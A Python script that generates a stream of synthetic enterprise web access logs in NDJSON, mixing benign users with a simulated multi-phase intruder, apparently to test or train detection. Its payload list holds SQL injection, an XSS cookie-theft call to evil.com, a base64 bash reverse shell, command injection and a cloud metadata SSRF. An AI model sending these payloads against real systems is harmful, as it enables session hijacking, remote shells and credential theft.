import random
import json
import uuid
import time
from datetime import datetime
import faker
import sys

fak = faker.Faker()

# --- Configuration ---
OUTPUT_FILE = "logfiles.log"
# Controls how fast the logs generate. Lower is faster.
MIN_SLEEP = 0.1
MAX_SLEEP = 1.0 

# --- Enterprise Datasets ---
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
]

ADVANCED_PAYLOADS = {
    "sqli_blind": ["1' AND (SELECT 8346 FROM (SELECT(SLEEP(5)))a)--", "admin' AND SUBSTRING(@@version,1,1)='5"],
    "xss_stored": ["<svg onload=fetch('//evil.com/'+document.cookie)>", "\"><script src=https://xss.ht></script>"],
    "rce_b64": ["/?cmd=YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS84MDgwIDA+JjE=", "/api/ping?ip=127.0.0.1%0Awhoami"],
    "ssrf": ["/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/", "/webhook?target=dict://127.0.0.1:11211/"],
    "deserialization": ["rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUQA... (truncated java payload)"]
}

# --- Actor Classes ---

class Actor:
    def __init__(self):
        self.ip = fak.ipv4()
        self.country = fak.country_code()
        self.asn = f"AS{random.randint(1000, 99999)}"
        self.is_active = True

class NormalUser(Actor):
    def __init__(self):
        super().__init__()
        self.ua = random.choice(USER_AGENTS)
        self.session_id = str(uuid.uuid4())
        self.steps = random.randint(3, 15)

    def next_action(self):
        if self.steps <= 0:
            self.is_active = False
            return None
        self.steps -= 1
        path = random.choice(["/home", "/dashboard", "/api/v1/profile", "/assets/app.js", "/checkout"])
        latency = random.randint(20, 150)
        size = random.randint(1000, 45000)
        return {
            "method": "GET", "path": path, "status": 200, 
            "bytes": size, "latency_ms": latency, "ua": self.ua, "cookie": f"session={self.session_id}"
        }

class AdvancedPersistentThreat(Actor):
    def __init__(self):
        super().__init__()
        self.ua = random.choice(USER_AGENTS) 
        self.phase = 0 # 0: Recon, 1: Exploit, 2: Exfil

    def next_action(self):
        if self.phase == 0:
            # Recon
            path = random.choice(["/.git/config", "/.env", "/actuator/health", "/admin/login"])
            self.phase = 1 if random.random() > 0.6 else 0
            return {"method": "GET", "path": path, "status": random.choice([403, 404]), "bytes": 250, "latency_ms": 10, "ua": self.ua, "cookie": "-"}
        
        elif self.phase == 1:
            # Exploit
            attack_type = random.choice(["rce_b64", "ssrf", "deserialization"])
            payload = random.choice(ADVANCED_PAYLOADS[attack_type])
            self.phase = 2
            return {"method": "POST", "path": payload, "status": 500, "bytes": 800, "latency_ms": 450, "ua": self.ua, "cookie": "-"}
            
        elif self.phase == 2:
            # Exfil
            self.is_active = False
            return {"method": "GET", "path": "/api/v1/export/users", "status": 200, "bytes": random.randint(5000000, 15000000), "latency_ms": 3500, "ua": self.ua, "cookie": "-"}

# --- Live Simulator Engine ---

class RealTimeSimulator:
    def __init__(self):
        self.actors = []
        
    def format_ndjson(self, actor, action):
        """Formats the event as an Enterprise SIEM NDJSON log."""
        log = {
            "@timestamp": datetime.utcnow().isoformat() + "Z", # Real UTC time
            "source": {
                "ip": actor.ip,
                "geo": {"country_iso_code": actor.country},
                "as": {"number": actor.asn}
            },
            "http": {
                "request": {
                    "method": action["method"],
                    "url": action["path"],
                    "headers": {
                        "user-agent": action["ua"],
                        "cookie": action["cookie"]
                    }
                },
                "response": {
                    "status_code": action["status"],
                    "bytes": action["bytes"],
                    "latency_ms": action["latency_ms"]
                }
            },
            "event": {
                "category": ["web", "network"],
                "type": ["access"]
            }
        }
        
        if isinstance(actor, AdvancedPersistentThreat):
            log["tags"] = ["malicious", "apt_simulation"]
        else:
            log["tags"] = ["benign"]
            
        return json.dumps(log) + "\n"

    def run(self):
        print(f"[*] Starting Real-Time Aegis-Connect Logger...")
        print(f"[*] Writing live telemetry to: {OUTPUT_FILE}")
        print(f"[*] Press Ctrl+C to stop.\n")
        
        try:
            # Open file in 'append' mode so it acts like a real log file
            with open(OUTPUT_FILE, 'a') as f:
                while True:
                    # 1. Randomly spawn new actors (Simulate incoming traffic)
                    if random.random() < 0.6: # 60% chance every tick to get new visitors
                        if random.random() < 0.05: # 5% of new visitors are APTs
                            self.actors.append(AdvancedPersistentThreat())
                        else:
                            self.actors.append(NormalUser())

                    # 2. Iterate through active actors and let them take actions
                    for actor in self.actors[:]:
                        # Not every active actor clicks something every single millisecond
                        if random.random() < 0.4: 
                            action = actor.next_action()
                            
                            if action:
                                log_str = self.format_ndjson(actor, action)
                                f.write(log_str)
                                f.flush() # Force write to disk immediately for real-time tailing
                                sys.stdout.write(log_str) # Print to console so you can see it working
                                sys.stdout.flush()
                            else:
                                # Remove actor if they are done (steps reached 0)
                                self.actors.remove(actor)

                    # 3. Sleep for a random interval to simulate real-world pacing
                    time.sleep(random.uniform(MIN_SLEEP, MAX_SLEEP))

        except KeyboardInterrupt:
            print("\n[*] Real-Time logging stopped by user.")
            sys.exit(0)

if __name__ == "__main__":
    sim = RealTimeSimulator()
    sim.run()